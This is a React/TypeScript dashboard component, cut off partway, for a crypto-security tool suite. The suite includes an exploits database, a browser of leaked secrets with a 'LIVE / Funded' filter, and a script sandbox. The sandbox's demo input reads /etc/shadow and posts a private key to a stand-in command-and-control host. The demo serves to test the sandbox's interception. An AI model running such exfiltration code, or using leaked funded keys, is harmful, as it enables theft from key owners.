import { useState, useEffect, useRef } from "react";
import { useTranslation } from "react-i18next";
import {
  Users,
  ArrowLeftRight,
  TrendingUp,
  ShieldCheck,
  GitCompare,
  Loader2,
  Lock,
  Search,
  AlertTriangle,
  Globe,
  Compass,
  KeyRound,
  History,
  Eye,
  Copy,
  Check,
  Flame,
  Layers,
  Radar,
  Zap,
  Terminal,
  UserCheck,
  BookOpen,
} from "lucide-react";
import {
  getSavedUser,
  authHeaders,
  apiGetToolHistory,
  apiGetToolHistoryItem,
  apiGetOspecFindingDetail,
  apiGetHackWriteup,
  type BorisUser,
  type BorisToolHistoryItem,
} from "@/lib/auth";

const API_BASE = "https://api.black-oracle.com";

type ToolId =
  | "holders"
  | "funds"
  | "market"
  | "social"
  | "soroban"
  | "ospec"
  | "zk"
  | "drift"
  | "hacks"
  | "proxy"
  | "surface"
  | "flash"
  | "deployer"
  | "sandbox";

const TIER_RANK: Record<string, number> = { GUEST: 0, RADAR: 1, RAW: 2, BLACKBOX: 3 };

const ToolsPanel = () => {
  const { i18n } = useTranslation();
  const isRu = i18n.language === "ru";
  const user = getSavedUser() as BorisUser | null;
  const tier = (user?.tier || "GUEST").toUpperCase();
  const rank = TIER_RANK[tier] ?? 0;

  const [tool, setTool] = useState<ToolId>("holders");
  const [input1, setInput1] = useState("");
  const [input2, setInput2] = useState("");
  const [chain, setChain] = useState("ethereum");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<any>(null);

  const [historyItems, setHistoryItems] = useState<BorisToolHistoryItem[]>([]);
  const [historyFilter, setHistoryFilter] = useState<string>("all");
  const [loadingHistoryId, setLoadingHistoryId] = useState<number | null>(null);

  // OSPEC Telegram-style filter states
  const [ospecSeverity, setOspecSeverity] = useState<string>("");
  const [ospecOnlyReal, setOspecOnlyReal] = useState<boolean>(true);
  const [ospecOnlyLive, setOspecOnlyLive] = useState<boolean>(false);
  const [ospecOffset, setOspecOffset] = useState<number>(0);
  const [expandedFindingId, setExpandedFindingId] = useState<number | null>(null);
  const [findingDetail, setFindingDetail] = useState<Record<number, any>>({});
  const [loadingFindingId, setLoadingFindingId] = useState<number | null>(null);
  const [copiedSecretId, setCopiedSecretId] = useState<string | null>(null);
  const [openedHistoryBanner, setOpenedHistoryBanner] = useState<string | null>(null);

  // Full Markdown Writeup viewer for the 1,678 Deep Exploits DB
  const [expandedWriteupSlug, setExpandedWriteupSlug] = useState<string | null>(null);
  const [writeupCache, setWriteupCache] = useState<Record<string, any>>({});
  const [loadingWriteupSlug, setLoadingWriteupSlug] = useState<string | null>(null);

  const handleToggleWriteup = async (slug: string, title?: string) => {
    const key = slug || title || "";
    if (!key) return;
    if (expandedWriteupSlug === key && writeupCache[key]) {
      setExpandedWriteupSlug(null);
      return;
    }
    setExpandedWriteupSlug(key);
    if (writeupCache[key]) return;
    setLoadingWriteupSlug(key);
    try {
      const data = await apiGetHackWriteup(slug, title);
      setWriteupCache((prev) => ({ ...prev, [key]: data }));
    } catch (e: any) {
      setWriteupCache((prev) => ({ ...prev, [key]: { error: e.message } }));
    } finally {
      setLoadingWriteupSlug(null);
    }
  };

  const skipAutoOspecRef = useRef<boolean>(false);
  const resultsTopRef = useRef<HTMLDivElement | null>(null);

  const handleToggleOspecFinding = async (fid: number) => {
    if (expandedFindingId === fid) {
      setExpandedFindingId(null);
      return;
    }
    setExpandedFindingId(fid);
    if (findingDetail[fid]) return;
    setLoadingFindingId(fid);
    try {
      const detail = await apiGetOspecFindingDetail(fid);
      setFindingDetail((prev) => ({ ...prev, [fid]: detail }));
    } catch {
      // ignore
    } finally {
      setLoadingFindingId(null);
    }
  };

  const loadHistory = (filter?: string) => {
    const f = filter ?? historyFilter;
    apiGetToolHistory(f === "all" ? undefined : f).then(setHistoryItems);
  };

  useEffect(() => {
    loadHistory(historyFilter);
  }, [historyFilter]);

  const runOspecWithFilters = async (opts?: {
    q?: string;
    sev?: string;
    real?: boolean;
    live?: boolean;
    offset?: number;
  }) => {
    if (rank < 1) return;
    const qVal = opts?.q !== undefined ? opts.q : input1.trim();
    const sevVal = opts?.sev !== undefined ? opts.sev : ospecSeverity;
    const realVal = opts?.real !== undefined ? opts.real : ospecOnlyReal;
    const liveVal = opts?.live !== undefined ? opts.live : ospecOnlyLive;
    const offsetVal = opts?.offset !== undefined ? opts.offset : 0;
    setOspecOffset(offsetVal);

    setError(null);
    setOpenedHistoryBanner(null);
    setLoading(true);
    try {
      const res = await fetch(`${API_BASE}/api/tools/ospec`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders() },
        body: JSON.stringify({
          query: qVal,
          severity: sevVal,
          only_real: realVal,
          only_live: liveVal,
          offset: offsetVal,
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.detail || `HTTP ${res.status}`);
      setResult(data);
      loadHistory(historyFilter);
    } catch (e: any) {
      setError(e.message || "OSPEC error");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (skipAutoOspecRef.current) {
      skipAutoOspecRef.current = false;
      return;
    }
    if (tool === "ospec" && rank >= 1 && !result) {
      runOspecWithFilters({ q: "", sev: "", real: true, live: false, offset: 0 });
    }
  }, [tool]);

  const TOOLS: Array<{
    id: ToolId;
    labelRu: string;
    labelEn: string;
    icon: any;
    minRank: number;
    placeholder: string;
  }> = [
    { id: "holders", labelRu: "Холдеры и киты", labelEn: "Holders & Whales", icon: Users, minRank: 0, placeholder: "0xA0b86991...B48" },
    { id: "market", labelRu: "Рынок и деривативы", labelEn: "Market & Derivatives", icon: TrendingUp, minRank: 0, placeholder: "BTC / ETH / SOL / PEPE" },
    { id: "funds", labelRu: "Потоки средств 14д", labelEn: "Funds Flow 14d", icon: ArrowLeftRight, minRank: 1, placeholder: "0xA0b86991...B48" },
    { id: "social", labelRu: "Social & OSINT", labelEn: "Social & OSINT", icon: Globe, minRank: 0, placeholder: "@handle, org/repo, t.me/..., x.com/..." },
    { id: "soroban", labelRu: "Soroban / Stellar", labelEn: "Soroban / Stellar", icon: Compass, minRank: 0, placeholder: "USDC, AQUA, CODE:ISSUER, C..." },
    { id: "ospec", labelRu: "OSPEC (Утечки 1.1M)", labelEn: "OSPEC (1.1M Secrets)", icon: KeyRound, minRank: 1, placeholder: "Фильтр по типу секрета или org/repo (пусто = последние находки)" },
    { id: "hacks", labelRu: "База 2,539 взломов (1,678 разборов + PoC)", labelEn: "2,539 Exploits DB (1,678 Writeups + PoC)", icon: Flame, minRank: 1, placeholder: "0x... контракт ИЛИ поиск по 1,678 разборам: uranium, euler, curve, slot0, reentrancy" },
    { id: "deployer", labelRu: "Деплоер & Профайлер Адреса", labelEn: "Deployer & Address Profiler", icon: UserCheck, minRank: 1, placeholder: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (1 или несколько 0x-адресов)" },
    { id: "proxy", labelRu: "Proxy & EIP-1967 Инспектор", labelEn: "Proxy & EIP-1967 Inspector", icon: Layers, minRank: 1, placeholder: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
    { id: "flash", labelRu: "Flash-Loan & Spot-Оракул", labelEn: "Flash-Loan & Spot Oracle", icon: Zap, minRank: 1, placeholder: "0x1F98431c8aD98523631AE4a59f267346ea31F984" },
    { id: "surface", labelRu: "Web3 Surface Mapper (Домен)", labelEn: "Web3 Surface Mapper (Domain)", icon: Radar, minRank: 1, placeholder: "across.to / rhino.fi / app.uniswap.org" },
    { id: "drift", labelRu: "Audit Drift (Репозиторий)", labelEn: "Audit Drift (Repo Audits)", icon: GitCompare, minRank: 1, placeholder: "https://github.com/Uniswap/v4-core или org/repo" },
    { id: "zk", labelRu: "ZK / Groth16 аудит", labelEn: "ZK Groth16 Audit", icon: ShieldCheck, minRank: 2, placeholder: "0x... verifier" },
    { id: "sandbox", labelRu: "Matrix Sandbox v16.2", labelEn: "Matrix Sandbox v16.2", icon: Terminal, minRank: 2, placeholder: "import requests, subprocess..." },
  ];

  const run = async () => {
    if (tool === "ospec") {
      await runOspecWithFilters();
      return;
    }
    setError(null);
    setResult(null);
    setLoading(true);
    try {
      let path = "";
      let body: any = {};
      if (tool === "holders") {
        path = "/api/tools/holders";
        body = { address: input1.trim(), chain };
      } else if (tool === "funds") {
        path = "/api/tools/funds-flow";
        body = { address: input1.trim(), chain, days: 14 };
      } else if (tool === "market") {
        path = "/api/tools/market";
        body = { symbol: input1.trim().toUpperCase() };
      } else if (tool === "social") {
        path = "/api/tools/social";
        body = { target: input1.trim() };
      } else if (tool === "soroban") {
        path = "/api/tools/soroban";
        body = { target: input1.trim() };
      } else if (tool === "zk") {
        path = "/api/tools/zk-audit";
        body = { address: input1.trim(), chain };
      } else if (tool === "hacks") {
        path = "/api/tools/hack-matcher";
        body = { address: input1.trim(), chain };
      } else if (tool === "proxy") {
        path = "/api/tools/proxy-check";
        body = { address: input1.trim(), chain };
      } else if (tool === "surface") {
        path = "/api/tools/surface-map";
        body = { domain: input1.trim() };
      } else if (tool === "flash") {
        path = "/api/tools/flash-spot";
        body = { address: input1.trim(), chain };
      } else if (tool === "deployer") {
        path = "/api/tools/address-profile";
        body = { address: input1.trim(), chain };
      } else if (tool === "sandbox") {
        path = "/api/tools/sandbox";
        body = { code: input1 };
      } else {
        path = "/api/tools/drift-compare";
        body = { repo_url: input1.trim() };
      }

      const res = await fetch(`${API_BASE}${path}`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders() },
        body: JSON.stringify(body),
      });
      if (res.status === 403) {
        const d = await res.json().catch(() => ({}));
        throw new Error(d.detail || (isRu ? "Этот инструмент недоступен на вашем тарифе." : "This tool is not available on your tier."));
      }
      if (res.status === 401) {
        throw new Error(isRu ? "Требуется вход в личный кабинет." : "Sign in required.");
      }
      if (!res.ok) {
        const d = await res.json().catch(() => ({}));
        throw new Error(d.detail || `HTTP ${res.status}`);
      }
      setResult(await res.json());
      loadHistory(historyFilter);
    } catch (e: any) {
      setError(e.message || "Error");
    } finally {
      setLoading(false);
    }
  };

  const handleOpenHistoryItem = async (item: BorisToolHistoryItem) => {
    setLoadingHistoryId(item.id);
    setError(null);
    try {
      const data = await apiGetToolHistoryItem(item.id);
      if (data && data.result) {
        skipAutoOspecRef.current = true;
        const r = data.result;
        // Normalize legacy OSPEC history records if needed
        if (item.tool === "ospec" && Array.isArray(r.findings)) {
          r.findings = r.findings.map((f: any) => ({
            ...f,
            hits: f.hits || 1,
            kind: String(f.kind || "SECRET").replace("secret:", ""),
            gh_url: f.gh_url || f.repo_url || "",
          }));
          if (!r.filter_mode) r.filter_mode = `history:${item.target}`;
        }
        setTool(item.tool as ToolId);
        setInput1(item.target || "");
        setResult(r);
        setOpenedHistoryBanner(
          `${item.tool.toUpperCase()} · ${item.target} (${new Date(item.created_at * 1000).toLocaleString()})`
        );
        setTimeout(() => {
          resultsTopRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
        }, 80);
      }
    } catch (e: any) {
      setError(e.message || "Failed to load saved tool report");
    } finally {
      setLoadingHistoryId(null);
    }
  };

  const active = TOOLS.find((t) => t.id === tool)!;
  const locked = rank < active.minRank;

  const fmt = (n: any, digits = 2) => {
    const v = Number(n);
    if (!isFinite(v)) return "—";
    if (Math.abs(v) >= 1e9) return (v / 1e9).toFixed(2) + "B";
    if (Math.abs(v) >= 1e6) return (v / 1e6).toFixed(2) + "M";
    if (Math.abs(v) >= 1e3) return (v / 1e3).toFixed(2) + "K";
    return v.toFixed(digits);
  };

  return (
    <div ref={resultsTopRef} className="space-y-5">
      {openedHistoryBanner && (
        <div className="flex items-center justify-between gap-3 rounded-xl border border-primary/50 bg-primary/10 px-4 py-2.5 font-mono text-xs text-primary">
          <span>
            📂 {isRu ? "Открыт сохранённый отчёт из истории:" : "Loaded saved report from history:"}{" "}
            <b className="text-foreground">{openedHistoryBanner}</b>
          </span>
          <button
            type="button"
            onClick={() => setOpenedHistoryBanner(null)}
            className="text-muted-foreground hover:text-foreground"
          >
            ✕
          </button>
        </div>
      )}
      {/* Tool selector */}
      <div className="flex flex-wrap gap-2">
        {TOOLS.map((t) => {
          const Icon = t.icon;
          const isLocked = rank < t.minRank;
          return (
            <button
              key={t.id}
              onClick={() => {
                setTool(t.id);
                setResult(null);
                setError(null);
                setInput1("");
                setInput2("");
              }}
              className={`inline-flex items-center gap-2 rounded-xl px-3.5 py-2.5 font-mono text-xs font-semibold transition-all ${
                tool === t.id
                  ? "bg-primary text-primary-foreground shadow"
                  : "border border-border bg-card text-muted-foreground hover:text-foreground"
              }`}
            >
              <Icon size={14} />
              <span>{isRu ? t.labelRu : t.labelEn}</span>
              {isLocked && <Lock size={11} className="opacity-70" />}
            </button>
          );
        })}
      </div>

      {/* Input form */}
      {locked ? (
        <div className="rounded-xl border border-primary/35 bg-card p-8 text-center bg-radial-red">
          <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-2xl border border-primary/40 bg-primary/15 text-primary">
            <Lock size={22} />
          </div>
          <span className="rounded-full border border-primary/40 bg-primary/15 px-3 py-1 font-mono text-[10px] font-bold uppercase tracking-widest text-primary">
            {active.minRank === 2 ? "RAW / BLACKBOX REQUIRED" : "RADAR+ REQUIRED"}
          </span>
          <p className="mx-auto mt-3 max-w-md font-mono text-xs text-muted-foreground">
            {isRu
              ? `Инструмент «${active.labelRu}» доступен начиная с тарифа ${active.minRank === 2 ? "RAW" : "RADAR"}.`
              : `"${active.labelEn}" requires ${active.minRank === 2 ? "RAW" : "RADAR"} tier or higher.`}
          </p>
        </div>
      ) : (
        <div className="rounded-xl border border-border bg-card p-5 space-y-3">
          {tool === "sandbox" ? (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center justify-between gap-2 font-mono text-xs">
                <span className="text-muted-foreground">
                  {isRu
                    ? "Вставьте подозрительный Python / Web3 скрипт или PoC-эксплойт (вызовы requests/subprocess/os/socket/web3 перехватываются до исполнения):"
                    : "Paste untrusted Python / Web3 script or PoC (requests/subprocess/os/socket/web3 calls are intercepted pre-execution):"}
                </span>
                <button
                  type="button"
                  onClick={() =>
                    setInput1(
                      `import requests, subprocess\n# Matrix Sandbox v16.2 Demo: secret file read + C2 exfil + shell spawn\ntry:\n    open("/etc/shadow").read()\nexcept Exception as e:\n    print("Blocked secret file:", e)\nrequests.post("https://c2-collector.example/drop", json={"pk": "0xdeadbeef"})\nsubprocess.run(["id"])\nprint("Sandbox execution finished")`
                    )
                  }
                  className="rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 text-[11px] font-semibold text-primary hover:bg-primary hover:text-primary-foreground"
                >
                  {isRu ? "⚡ Вставить демо-тест Matrix v16.2" : "⚡ Load Matrix v16.2 Demo"}
                </button>
              </div>
              <textarea
                rows={6}
                value={input1}
                onChange={(e) => setInput1(e.target.value)}
                placeholder={active.placeholder}
                className="w-full rounded-xl border border-border bg-background p-3.5 font-mono text-xs text-foreground outline-none focus:border-primary"
              />
              <div className="flex justify-end">
                <button
                  onClick={run}
                  disabled={loading || !input1.trim()}
                  className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-5 py-2.5 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
                >
                  {loading ? <Loader2 size={14} className="animate-spin" /> : <Terminal size={14} />}
                  <span>{loading ? (isRu ? "Изоляция v16.2…" : "Isolating v16.2…") : isRu ? "Запустить в Matrix Sandbox v16.2" : "Run in Matrix Sandbox v16.2"}</span>
                </button>
              </div>
            </div>
          ) : (
            <div className="grid grid-cols-1 gap-3 sm:grid-cols-4">
              <input
                value={input1}
                onChange={(e) => setInput1(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && (tool === "ospec" || tool === "hacks" || input1) && run()}
                placeholder={active.placeholder}
                className="rounded-xl border border-border bg-background px-4 py-3 font-mono text-xs text-foreground outline-none focus:border-primary sm:col-span-2"
              />
              {(tool === "holders" || tool === "funds" || tool === "zk" || tool === "hacks" || tool === "proxy" || tool === "flash" || tool === "deployer") ? (
                <select
                  value={chain}
                  onChange={(e) => setChain(e.target.value)}
                  className="rounded-xl border border-border bg-background px-3 py-3 font-mono text-xs text-foreground outline-none focus:border-primary"
                >
                  {["ethereum", "bsc", "polygon", "arbitrum", "base", "optimism"].map((c) => (
                    <option key={c} value={c}>
                      {c.toUpperCase()}
                    </option>
                  ))}
                </select>
              ) : (
                <div className="flex items-center rounded-xl border border-border bg-background/60 px-4 py-3 font-mono text-xs text-muted-foreground">
                  {tool === "market"
                    ? isRu ? "Тикер монеты" : "Coin ticker"
                    : tool === "social"
                    ? "X / TG / Discord / GitHub"
                    : tool === "soroban"
                    ? "Stellar / Soroban SIM"
                    : tool === "drift"
                    ? isRu ? "Папки audits/ + Git Drift" : "audits/ PDFs + Git Drift"
                    : tool === "surface"
                    ? "Subdomains + JS Bundles"
                    : "OSPEC Harvester DB (RADAR+)"}
                </div>
              )}
              <button
                onClick={run}
                disabled={loading || (tool !== "ospec" && tool !== "hacks" && !input1)}
                className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
              >
                {loading ? <Loader2 size={14} className="animate-spin" /> : <Search size={14} />}
                <span>{loading ? (isRu ? "Считаю…" : "Running…") : isRu ? "Запустить" : "Run"}</span>
              </button>
            </div>
          )}

          {/* Quick presets for 2,539 Exploits DB (1,678 Deep Writeups + 861 DeFiHackLabs) */}
          {tool === "hacks" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">
                {isRu ? "Быстрый поиск по 1,678 разборам или 0x-контракту:" : "Quick search across 1,678 writeups or 0x contract:"}
              </span>
              {[
                { label: "Uranium ($50M K-Check)", val: "uranium" },
                { label: "Euler Finance", val: "euler" },
                { label: "Curve / Vyper Reentrancy", val: "curve" },
                { label: "UniV3 slot0 Oracle", val: "slot0" },
                { label: "Cross-Chain Bridges", val: "vuln/bridge" },
                { label: "0x1F98...F984 (UniV3 Factory)", val: "0x1F98431c8aD98523631AE4a59f267346ea31F984" },
              ].map((p) => (
                <button
                  key={p.val}
                  type="button"
                  onClick={() => setInput1(p.val)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {p.label}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for Audit Drift (GitHub repos with audits/ folders) */}
          {tool === "drift" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые репо с аудитами:" : "Quick audited repos:"}</span>
              {[
                "https://github.com/Uniswap/v4-core",
                "https://github.com/aave/aave-v3-core",
                "https://github.com/OpenZeppelin/openzeppelin-contracts",
              ].map((preset) => (
                <button
                  key={preset}
                  type="button"
                  onClick={() => setInput1(preset)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {preset.replace("https://github.com/", "")}
                </button>
              ))}
            </div>
          )}

          {/* Telegram-style quick filters for OSPEC */}
          {tool === "ospec" && (
            <div className="space-y-2 pt-1">
              <div className="flex flex-wrap items-center gap-2 font-mono text-[11px]">
                <button
                  type="button"
                  onClick={() => {
                    setInput1("");
                    setOspecSeverity("");
                    setOspecOnlyReal(true);
                    setOspecOnlyLive(false);
                    runOspecWithFilters({ q: "", sev: "", real: true, live: false, offset: 0 });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    !ospecSeverity && ospecOnlyReal && !ospecOnlyLive && !input1
                      ? "border-primary bg-primary/15 text-primary"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🔍 {isRu ? "Последние REAL" : "Recent REAL"}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const next = ospecSeverity === "CRITICAL" ? "" : "CRITICAL";
                    setOspecSeverity(next);
                    runOspecWithFilters({ sev: next });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    ospecSeverity === "CRITICAL"
                      ? "border-destructive bg-destructive/20 text-destructive"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🔴 Critical
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const next = ospecSeverity === "HIGH" ? "" : "HIGH";
                    setOspecSeverity(next);
                    runOspecWithFilters({ sev: next });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    ospecSeverity === "HIGH"
                      ? "border-primary bg-primary/20 text-primary"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🟠 High
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const next = !ospecOnlyReal;
                    setOspecOnlyReal(next);
                    runOspecWithFilters({ real: next });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    ospecOnlyReal
                      ? "border-green-500/60 bg-green-500/15 text-green-400"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🟢 {isRu ? "Только REAL" : "Only REAL"}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const next = !ospecOnlyLive;
                    setOspecOnlyLive(next);
                    runOspecWithFilters({ live: next });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    ospecOnlyLive
                      ? "border-amber-500/60 bg-amber-500/15 text-amber-400"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🔥 {isRu ? "LIVE / С балансом" : "LIVE / Funded"}
                </button>
              </div>

              {result?.kind_stats?.length > 0 && (
                <div className="flex flex-wrap items-center gap-1.5 font-mono text-[10px]">
                  <span className="text-muted-foreground">{isRu ? "Типы секретов:" : "Secret kinds:"}</span>
                  {result.kind_stats.slice(0, 8).map((ks: any) => {
                    const shortKind = String(ks.kind || "").replace("secret:", "");
                    return (
                      <button
                        key={ks.kind}
                        type="button"
                        onClick={() => {
                          setInput1(shortKind);
                          runOspecWithFilters({ q: shortKind });
                        }}
                        className="rounded border border-border bg-background px-2 py-0.5 text-muted-foreground hover:border-primary hover:text-primary"
                      >
                        {shortKind} <span className="text-primary">({ks.real})</span>
                      </button>
                    );
                  })}
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {error && (
        <div className="flex items-start gap-2 rounded-xl border border-destructive/40 bg-destructive/10 p-4 font-mono text-xs text-destructive">
          <AlertTriangle size={14} className="mt-0.5 shrink-0" />
          <span>{error}</span>
        </div>
      )}

      {/* RESULTS */}
      {result && tool === "market" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {[
              { k: isRu ? "Цена" : "Price", v: `$${fmt(result.snapshot?.price_usd)}` },
              { k: "24h", v: `${Number(result.snapshot?.price_change_24h ?? 0).toFixed(2)}%` },
              { k: "Volume 24h", v: `$${fmt(result.snapshot?.volume_24h)}` },
              { k: isRu ? "Капитализация" : "Market Cap", v: `$${fmt(result.snapshot?.market_cap)}` },
              { k: "Open Interest", v: `$${fmt(result.snapshot?.oi_usdt)}` },
              { k: "ΔOI 24h", v: `${Number(result.snapshot?.oi_change_24h_pct ?? 0).toFixed(2)}%` },
              { k: "Funding", v: `${(Number(result.snapshot?.funding_rate ?? 0) * 100).toFixed(4)}%` },
              { k: "Long/Short", v: fmt(result.snapshot?.long_short_ratio) },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 font-mono text-lg font-bold text-foreground">{c.v}</p>
              </div>
            ))}
          </div>
          <div className="rounded-xl border border-border bg-card p-5">
            <div className="flex flex-wrap items-center gap-3">
              <span className={`rounded-full px-3 py-1 font-mono text-xs font-bold ${
                result.level === "CRITICAL" || result.level === "HIGH"
                  ? "bg-destructive/20 text-destructive border border-destructive/40"
                  : "bg-primary/15 text-primary border border-primary/40"
              }`}>
                {result.level} · {result.score}/100
              </span>
              <span className="font-mono text-xs text-muted-foreground">
                Organic: {result.organic_probability}% · Crowd: {result.crowd_overcrowding}
              </span>
              {result.github_repo && (
                <span className="font-mono text-xs text-primary">gh: {result.github_repo}</span>
              )}
            </div>
            <p className="mt-3 font-mono text-xs text-foreground">{result.conclusion}</p>
            {result.signals?.length > 0 && (
              <div className="mt-4 space-y-2">
                {result.signals.map((s: any, i: number) => (
                  <div key={i} className="rounded-lg border border-border bg-background p-3">
                    <div className="flex items-center justify-between gap-3">
                      <span className="font-mono text-xs font-bold text-foreground">{s.name}</span>
                      <span className="font-mono text-[10px] text-muted-foreground">{s.category} · {s.score}</span>
                    </div>
                    <p className="mt-1 font-mono text-[11px] text-muted-foreground">{s.detail}</p>
                  </div>
                ))}
                {result.signals_total > result.signals.length && (
                  <p className="font-mono text-[11px] text-primary">
                    +{result.signals_total - result.signals.length} {isRu ? "сигналов скрыто (нужен тир выше)" : "more signals hidden (higher tier)"}
                  </p>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {result && tool === "holders" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {[
              { k: isRu ? "Всего холдеров" : "Total Holders", v: fmt(result.total_holders, 0) },
              { k: "Top-10", v: `${result.top10_pct}%` },
              { k: "Top-10 real", v: `${result.top10_real_pct}%` },
              { k: "Whales", v: `${result.whale_pct}%` },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 font-mono text-lg font-bold text-foreground">{c.v}</p>
              </div>
            ))}
          </div>
          <div className="rounded-xl border border-border bg-card p-5">
            <div className="mb-3 flex items-center justify-between">
              <span className={`rounded-full px-3 py-1 font-mono text-xs font-bold border ${
                result.centralization_risk === "CRITICAL" || result.centralization_risk === "HIGH"
                  ? "bg-destructive/20 text-destructive border-destructive/40"
                  : "bg-primary/15 text-primary border-primary/40"
              }`}>
                {result.centralization_risk} · {result.centralization_score}/100
              </span>
              {result.locked && (
                <span className="inline-flex items-center gap-1 font-mono text-[10px] text-primary">
                  <Lock size={11} /> {isRu ? "адреса замаскированы [RADAR+]" : "addresses masked [RADAR+]"}
                </span>
              )}
            </div>
            <div className="space-y-1.5">
              {result.top_holders?.map((h: any) => (
                <div key={h.rank} className="flex items-center justify-between gap-3 rounded-lg border border-border bg-background px-3 py-2">
                  <span className="w-6 font-mono text-[11px] text-muted-foreground">#{h.rank}</span>
                  <span className="flex-1 truncate font-mono text-[11px] text-foreground">{h.address}</span>
                  <span className="font-mono text-[10px] uppercase text-muted-foreground">{h.holder_type}</span>
                  <span className="w-16 text-right font-mono text-xs font-bold text-primary">{h.percentage}%</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {result && tool === "funds" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {[
              { k: isRu ? "Риск" : "Risk", v: `${result.risk_score}/100` },
              { k: isRu ? "Манипуляции" : "Manipulation", v: `${result.manipulation_score}/100` },
              { k: "Bot Activity", v: `${result.bot_activity_score}/100` },
              { k: "TX / адреса", v: `${fmt(result.total_transactions, 0)} / ${fmt(result.unique_addresses, 0)}` },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 font-mono text-lg font-bold text-foreground">{c.v}</p>
              </div>
            ))}
          </div>
          <div className="flex flex-wrap gap-2">
            {result.has_wash_trading && <span className="rounded-full border border-destructive/40 bg-destructive/15 px-3 py-1 font-mono text-[10px] font-bold text-destructive">WASH TRADING</span>}
            {result.has_mixer_usage && <span className="rounded-full border border-destructive/40 bg-destructive/15 px-3 py-1 font-mono text-[10px] font-bold text-destructive">MIXER USAGE</span>}
            {result.has_bot_activity && <span className="rounded-full border border-primary/40 bg-primary/15 px-3 py-1 font-mono text-[10px] font-bold text-primary">BOT ACTIVITY</span>}
            <span className="rounded-full border border-border bg-card px-3 py-1 font-mono text-[10px] text-muted-foreground">{result.cluster_count} clusters · {result.days}d · {result.chain}</span>
          </div>
          <div className="rounded-xl border border-border bg-card p-5">
            <p className="mb-2 font-mono text-[10px] uppercase tracking-wider text-primary">{isRu ? "Сигналы" : "Signals"}</p>
            <div className="space-y-2">
              {result.signals?.map((s: any, i: number) => (
                <div key={i} className="rounded-lg border border-border bg-background p-3">
                  <div className="flex items-center justify-between">
                    <span className="font-mono text-[11px] font-bold text-foreground">{s.type}</span>
                    <span className="font-mono text-[10px] text-muted-foreground">{s.severity} · {s.confidence}%</span>
                  </div>
                  <p className="mt-1 font-mono text-[11px] text-muted-foreground">{s.description}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {result && tool === "zk" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">{result.address}</span>
              <span className="ml-2 text-muted-foreground">({result.chain})</span>
            </div>
            <span
              className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
                (result.critical_count || 0) > 0 || (result.high_count || 0) > 0
                  ? "border-red-500/50 bg-red-500/15 text-red-400"
                  : "border-green-500/50 bg-green-500/15 text-green-400"
              }`}
            >
              {result.verdict || "ZK AUDIT COMPLETE"} · Findings: {result.verifiers_found}
            </span>
          </div>

          {result.radar_metadata && (
            <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
              <div className="rounded-lg border border-border bg-background p-3">
